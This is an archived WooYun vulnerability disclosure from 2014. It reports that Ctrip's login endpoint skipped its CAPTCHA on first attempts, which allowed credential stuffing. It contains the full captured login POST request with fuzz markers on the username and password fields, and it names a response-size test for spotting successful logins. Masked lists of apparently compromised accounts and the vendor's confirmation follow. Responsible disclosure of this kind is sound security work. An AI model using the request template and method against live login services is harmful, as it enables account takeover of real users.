{"id": 571, "wybug_id": "wooyun-2014-075096", "wybug_title": "绕过携程主站登录接口限制进行撞库攻击", "wybug_corp": "携程旅行网", "wybug_author": "niliu", "wybug_date": "2014-09-05 00:12", "wybug_open_date": "2014-10-20 00:14", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向公众公开  简要描述： 没想到主站登录接口就这样被绕过了，真是最安全的地方就是最危险的地方... 详细说明：  具体过程如下：主站登录错误后是需要弹出验证码的，这个之前测试过就知道。这次又翻到主站，因为第一次登录是没有验证码的，所以连试都没试，直接填写账号密码，开代理，抓包。然后大数据撞库。令人吃惊的是这样抓的包，竟然可以直接fuzz啊...由于时间关系，就测试了一小部分数据，成功率还是比较高的。过程：第一次登录时抓包\n\n\nPOST /member/login.aspx HTTP/1.1Host: accounts.ctrip.comConnection: keep-aliveContent-Length: 2450Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://accounts.ctrip.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: https://accounts.ctrip.com/member/login.aspxAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie:__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUJNjI4OTIwNTgzDxYCHgNkZGQy3AQAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAQBAAAA4gFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5EaWN0aW9uYXJ5YDJbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAdWZXJzaW9uCENvbXBhcmVyCEhhc2hTaXplAAMACJIBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuR2VuZXJpY0VxdWFsaXR5Q29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAAAAAAkCAAAAAAAAAAQCAAAAkgFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5HZW5lcmljRXF1YWxpdHlDb21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQAAAAALFgJmD2QWBgICDxYCHgVzdHlsZQUNZGlzcGxheTpub25lOxYCAgEPFgIfAQUSdmlzaWJpbGl0eTpoaWRkZW47ZAITDxAPFgYeDURhdGFUZXh0RmllbGQFD1F1ZXN0aW9uQ29udGVudB4ORGF0YVZhbHVlRmllbGQFAklkHgtfIURhdGFCb3VuZGdkEBUKEuaCqOeItuS6sueahOWnk%2BWQjRLmgqjmr43kurLnmoTlp5PlkI0S5oKo54ix5Lq655qE55Sf5pelEuaCqOWutuW6reeahOeUteivnRLmgqjlhazlj7jnmoTlkI3np7AS5oKo5q%2BV5Lia55qE5a2m5qChEuaCqOWWnOasoueahOminOiJshLmgqjlhbvnmoTlrqDnianlkI0S5oKo5pyA5Zac5qyi55qE5q2MEuaCqOacgOW0h%2BaLnOeahOS6uhUKATEBMgEzATQBNQE2ATcBOAE5AjEwFCsDCmdnZ2dnZ2dnZ2dkZAIXDxAPFgYfAgUPUXVlc3Rpb25Db250ZW50HwMFAklkHwRnZBAVChLmgqjniLbkurLnmoTlp5PlkI0S5oKo5q%2BN5Lqy55qE5aeT5ZCNEuaCqOeIseS6uueahOeUn%2BaXpRLmgqjlrrbluq3nmoTnlLXor50S5oKo5YWs5Y%2B455qE5ZCN56ewEuaCqOavleS4mueahOWtpuagoRLmgqjllpzmrKLnmoTpopzoibIS5oKo5YW755qE5a6g54mp5ZCNEuaCqOacgOWWnOasoueahOatjBLmgqjmnIDltIfmi5znmoTkuroVCgExATIBMwE0ATUBNgE3ATgBOQIxMBQrAwpnZ2dnZ2dnZ2dnZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFDGNoa0F1dG9Mb2dpbg%3D%3D&signin_logintype=&done=&loginType=0&hdnToken=MjAxNC05LTQgMjI6NDk6MDY%3D&hidGohome=MjAxNC05LTQgMjI6NDg6MzM%3D&hidVerifyCodeLevel=N&VerifyCodeFlagDy=N&hidMask=F&1=on&txtUserName=§asdaaaaa§&txtPwd=§123456§&txtCode=&chkAutoLogin=on&btnSubmit=%B5%C7%C2%BC&mobilePhone=&txtCodePwd=&dyPwd=&hidToken=MjAxNC05LTQgMjI6NDk6MDY%3D&hidUid=&hidServerName=http%3A%2F%2Faccounts.ctrip.com&needCheckServerSession=F&cardname=&hid_cardname=0&txtCUserName=&txtCPwd=&txtVerifyCode=&txtMPwd=&txtReMPwd=&txtMSPwd=&txtReMSPwd=&selQuestion=1&txtMAnswer=&txtHIDCardNo=&txtHMobile=&txtHPwd=&txtReHPwd=&txtHSPwd=&txtReHSPwd=&selHQuestion=1&txtHAnswer=\n\n\n返回包大于40000的都是成功的设置好字典fuzz后的结果贴上部分数据\n\n\nmask 区域\n\n*****m\t： **********.com\t^**********m\t：  **********com\t：**********\t：lei**********com\t^**********com\t：w**********com\t^**********.com\t：**********.com\t^**********com\t：**********l.com\t：**********com\t：**********m\t：x8**********m\t：jsa**********com\t：s**********com\t：Lo**********.com\t^**********il.com\t^*****\n\n\n\n\n登录测试截图\n\nmask 区域\n*****com\t：*****\n\n\n\n登录会有一个提示，无影响\n\n\n\nmask 区域\n*****il.com\t^*****\n\n\n\n\n\nmask 区域\n*****com\t：*****\n\n\n\n   漏洞证明：  综上所述。   修复方案：  主站登录接口第一次无验证码登录次数限制。   版权声明：转载请注明来源 niliu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-09-09 12:44 厂商回复： 感谢您提交此漏洞相关信息。漏洞已经提交至开发人员处进行修补。再次感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-09 14:42 |    \t\t啦绯哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:20        )\t\t \n  正常现象    \n     2014-09-17 13:58 |    \t\t晴天 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 发现BUG，分享BUG。)\t\t \n  他家漏洞多如牛毛，都懒得爆了。    \n     2014-09-28 10:17 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  @啦绯哥  威武霸气    \n     2014-09-29 18:15 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  漏洞绕过携程主站登录接口限制进行撞库攻击（大量用户密码泄漏）已经对你公开了，可以提前去看看提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞蛋疼    \n     2014-09-29 18:22 |    \t\t携程旅行网(乌云厂商)\t\t \n  @啦绯哥 唉。。。。    \n     2014-10-08 20:47 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  @携程旅行网 额     \n     2014-10-20 11:42 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  总比某游戏公司任意登录口连验证码都不要来的强吧？@wangl 哈哈。    \n     2014-10-20 11:46 |    \t\tWangl \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 新浪支付，值得拥有)\t\t \n  @char 你麻痹，不要扯上我们大游族公司，好么。比他们携程安全多了。    \n     2014-10-20 11:49 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  @wangl，你说的是www.youzu.com么？好厉害的感觉。    \n     2014-10-20 12:41 |    \t\tWangl \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 新浪支付，值得拥有)\t\t \n  @char 说的好像你能找到漏洞似的。    \n     2014-10-20 16:20 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  估计又改过了吧 。出现的问题    \n     2014-10-27 15:04 |    \t\t携程旅行网(乌云厂商)\t\t \n  @小胖胖要减肥 以前是没这个漏洞的，碰巧那几天在升级验证码，所以。。。。    \n     2014-10-27 22:32 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @携程旅行网 囧  还是流程问题？    \n     2014-10-29 15:41 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @携程旅行网 。。。猪猪侠成就了一批土豪啊！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}